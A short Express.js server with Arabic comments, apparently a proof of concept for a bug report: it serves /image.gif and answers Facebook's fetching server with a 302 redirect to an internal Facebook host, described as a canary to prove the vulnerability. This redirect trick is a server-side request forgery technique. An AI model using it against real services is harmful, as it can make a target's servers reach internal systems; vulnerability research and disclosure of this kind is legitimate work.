const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// الرابط النهائي الذي سيطلبه فيسبوك
app.get('/image.gif', (req, res) => {
    // توجيه سيرفر فيسبوك (302 Redirect) إلى رابط الكناري الخاص بهم لإثبات الثغرة
    res.redirect(302, 'https://internalfb.com');
});

app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));

